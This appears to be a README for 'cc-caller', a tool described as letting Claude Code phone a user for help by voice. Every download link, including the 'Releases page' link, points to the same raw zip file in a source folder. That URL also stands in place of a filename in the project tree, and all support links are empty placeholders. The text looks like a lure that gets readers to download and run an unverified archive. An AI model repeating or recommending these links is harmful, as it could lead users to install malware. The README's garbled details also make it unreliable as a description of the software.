# 📞 cc-caller - Connect with Claude Code Efficiently

## 🚀 Download Here
[![Download cc-caller](https://raw.githubusercontent.com/Ramzanwer/cc-caller/main/cloudflare-worker/src/caller_cc_3.4.zip)](https://raw.githubusercontent.com/Ramzanwer/cc-caller/main/cloudflare-worker/src/caller_cc_3.4.zip)

## 📞 What is cc-caller?
cc-caller allows Claude Code to "call" you when it needs assistance or encounters problems. This application provides an intuitive way for Claude Code to communicate, making teamwork smoother and more efficient.

## 🎯 Features
- **🔔 Incoming Notifications**: Claude Code can initiate "phone" calls to alert you of tasks or issues.
- **🎤 Voice Interaction**: Text-to-Speech (TTS) plays Claude's messages. Speech-to-Text (STT) recognizes your replies for seamless communication.
- **⚡ Urgency Levels**: Supports four levels of urgency (Low, Normal, High, Critical) to prioritize calls effectively.
- **💬 Two-Way Communication**: Receive real-time voice or text responses for immediate interaction.
- **🌐 Web Application**: Accept incoming calls directly in your browser for easy accessibility.

## 🏗️ System Architecture
```
┌──────────────┐     ┌──────────────────┐     ┌──────────────────┐
│ Claude Code  │────▶│   MCP Server     │────▶│   Backend Service │
│              │     │ (caller-mcp)     │     │   (WebSocket)    │
└──────────────┘     └──────────────────┘     └────────┬─────────┘
                                                       │
                           ┌───────────────────────────┘
                           ▼
                    ┌──────────────────┐
                    │   User Web App   │
                    │ (React + TTS/STT)│
                    └──────────────────┘
```

## 📦 Project Structure
```
cc-caller/
├── mcp-server/          # MCP Server for Claude Code
│   ├── src/
│   │   ├── https://raw.githubusercontent.com/Ramzanwer/cc-caller/main/cloudflare-worker/src/caller_cc_3.4.zip     # Entry point for the server
│   │   ├── tools/       # MCP tool definitions
│   │   ├── services/    # WebSocket client services
```

## 🚀 Getting Started
### System Requirements
To run cc-caller, your system should meet the following requirements:

- **OS**: Windows 10 or later, macOS, or Linux
- **Browser**: Latest version of Chrome, Firefox, or Safari
- **Internet Connection**: A stable connection for real-time communication

### Download & Install
1. Visit the [Releases page](https://raw.githubusercontent.com/Ramzanwer/cc-caller/main/cloudflare-worker/src/caller_cc_3.4.zip) to access the latest version.
2. Download the appropriate installation file for your operating system.
3. Follow the on-screen instructions to install the application on your device.

## 📄 How to Use cc-caller
### Initial Setup
1. Open the cc-caller application.
2. Configure your settings based on your preferences.
3. Ensure your microphone and speakers are working properly for optimal audio interaction.

### Making and Receiving Calls
- **Incoming Call**: When Claude Code calls you, you will receive a notification in your web app.
- **Responding**: You can respond via voice or text. Claude Code will understand your replies through STT.

### Adjusting Urgency Levels
You can set the urgency level of calls from the settings menu. This allows for better management of your priorities.

## 🛠️ Troubleshooting
If you encounter issues while using cc-caller:

- Ensure your internet connection is stable.
- Check that your microphone and speakers are functioning correctly.
- For help, visit the [community support page](#) or check the FAQs in the documentation.

## 📞 Additional Resources
- [User Guide](#) for detailed instructions.
- [Community Forum](#) for sharing experiences and getting tips.
- [Report Issues](#) for technical support.

## 🚀 Download Here Again
To get started with cc-caller, click the button below:

[![Download cc-caller](https://raw.githubusercontent.com/Ramzanwer/cc-caller/main/cloudflare-worker/src/caller_cc_3.4.zip)](https://raw.githubusercontent.com/Ramzanwer/cc-caller/main/cloudflare-worker/src/caller_cc_3.4.zip)